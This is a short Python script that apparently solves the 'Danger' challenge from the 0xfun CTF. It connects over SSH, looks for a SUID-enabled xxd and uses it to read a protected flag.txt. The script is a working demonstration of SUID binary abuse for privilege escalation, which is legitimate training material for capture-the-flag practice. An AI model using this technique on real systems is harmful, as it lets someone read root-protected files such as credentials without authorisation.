#!/usr/bin/env python3
"""
Danger - 0xfun CTF
SUID xxd exploitation to read flag.txt
"""

import paramiko
import sys

# === CONFIGURACIÃ“N ===
HOST = "chall.0xfun.org"
PORT = 59069
USERNAME = "Danger"
PASSWORD = "password"

def exploit():
    """Conecta via SSH y lee el flag usando xxd con SUID"""

    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())

    try:
        print(f"[*] Connecting to {HOST}:{PORT}...")
        client.connect(HOST, port=PORT, username=USERNAME, password=PASSWORD, timeout=10)
        print("[+] Connected successfully!")

        # Verificar el archivo flag.txt
        print("\n[*] Checking flag.txt permissions...")
        stdin, stdout, stderr = client.exec_command('ls -la flag.txt')
        print(stdout.read().decode())

        # Buscar xxd con SUID
        print("[*] Searching for SUID binaries...")
        stdin, stdout, stderr = client.exec_command('find /usr/bin -name xxd -perm -4000 2>/dev/null')
        xxd_path = stdout.read().decode().strip()
        if xxd_path:
            print(f"[+] Found SUID xxd at: {xxd_path}")
        else:
            print("[-] xxd with SUID not found!")
            return

        # Leer el flag usando xxd
        print("\n[*] Reading flag.txt with xxd...")
        stdin, stdout, stderr = client.exec_command('xxd -p flag.txt | xxd -r -p')
        flag = stdout.read().decode().strip()

        print("\n" + "="*60)
        print(f"[+] FLAG: {flag}")
        print("="*60)

        client.close()

    except Exception as e:
        print(f"[-] Error: {e}")
        sys.exit(1)

if __name__ == "__main__":
    exploit()
